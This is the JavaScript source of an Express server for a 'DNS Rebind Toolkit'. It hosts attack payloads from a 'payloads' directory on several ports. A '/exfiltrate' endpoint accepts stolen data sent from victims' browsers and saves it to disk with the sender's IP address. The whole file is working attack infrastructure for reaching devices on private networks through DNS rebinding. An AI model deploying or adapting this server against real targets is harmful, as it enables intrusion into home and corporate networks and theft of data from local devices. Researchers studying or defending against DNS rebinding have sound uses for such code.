const fs               = require('fs')
const path             = require('path')
const http             = require('http')
const cors             = require('cors')
const bodyParser       = require('body-parser')
const express          = require('express')
const ArgumentParser   = require('argparse').ArgumentParser

const args = parseArgs()

const app = express()

// set a custom server header
app.use((req, res, next) => {
    res.set('Server', 'DNS Rebind Toolkit Server')
    next()
})

app.use(cors())
app.use('/', express.static(path.join(__dirname, 'www')))
app.use('/examples', express.static(path.join(__dirname, 'examples')))
app.use('/share', express.static(path.join(__dirname, 'share')))
app.use('/payloads', express.static(path.join(__dirname, 'payloads')))

// catch all
app.get(/.*/, (req, res) => {
    const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress
    console.log(`[*] GET ${req.url}`)
    res.sendStatus(204)
})

app.use('/exfiltrate', bodyParser.json())
app.post('/exfiltrate', (req, res) => {

    console.log(`[*] POST ${req.url}`)
    const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress
    const post = req.body
    const type = post.type ? post.type.toLowerCase() : 'json'
    let data = post.data

    if (!post.data || 
        !post.name || 
        post.type && !['json', 'xml', 'txt'].includes(post.type.toLowerCase())) {
        console.error('[!] POST request doesn\'t contain the required fields')
        res.sendStatus(400)
        return
    } else if (post.name.includes('..') || post.name.includes(path.sep)) {
        console.error(`[!] invalid filename "${post.filename}"`)
        res.sendStatus(400)
        return
    }
    
    if (type == 'json') {
        try {
            data = JSON.stringify(post.data)
        } catch (err) {
            console.error(`[!] failed to parse JSON:`)
            console.error(post.data)
            console.error(err)
            res.sendStatus(400)
            return
        }
    }

    const name = `${post.name}-${Date.now()}-${ip}.${type}`
    const filename = path.join(__dirname, 'data', name)

    fs.writeFile(filename, data, (err) => {
        if (err) {
            console.error(`[!] error saving ${filename}:`)
            console.error(err)
            res.sendStatus(500) // Internal server error
        } else {
            res.sendStatus(204) // 204 No Content
            console.log(`[+] saved data to ${filename}`)
        }
    })
})

// create a new server callback on each --port
args.port.forEach(port => {

    const server = http.createServer(app).listen(port, () => {
        console.log(`[+] server listening on port ${port}`)
    })

    server.on('error', (err) => {
        if (err.code == 'EADDRINUSE') {
            console.error(`[!] cannot bind server to port ${port}, address in use.`)
        } else if (err.code == 'EACCES') {
            let msg = `[!] cannot bind server to port ${port}, access denied.`
            msg += ` Does that port require root?`
            console.error(msg)
        } else {
            console.error(`[!] server error:`)
            console.error(err)
        }
    })
})

function parseArgs() {

    const parser = new ArgumentParser({
      version: '1.0.0',
      addHelp: true,
      description: 'DNS Rebind Toolkit server'
    })

    const defaultPorts = [80, 8008, 8060, 1400, 1337]
    parser.addArgument(
      [ '-p', '--port' ],
      {
        action: 'append',
        defaultValue: [],
        help: 'Which ports to bind the servers on. May include multiple like: '
        + '--port 80 --port 1337 '
        + '(default: -p 80 -p 8008 -p 8060 -p 1400 -p 1337)'
      }
    )

    const args = parser.parseArgs()

    args.port.forEach(port => {
        if (!isInt(port)) {
            console.error(`[fatal] --port must be an integer, not "${port}"`)
            process.exit(0)
        }
    })
    
    if (args.port.length < 1) {
        args.port = defaultPorts
        console.log('[!] no ports specified, using defauls')
    }

    return args
}

// https://stackoverflow.com/questions/14636536/how-to-check-if-a-variable-is-an-integer-in-javascript#14794066
function isInt(value) {
    return !isNaN(value) &&
         parseInt(Number(value)) == value &&
         !isNaN(parseInt(value, 10))
}
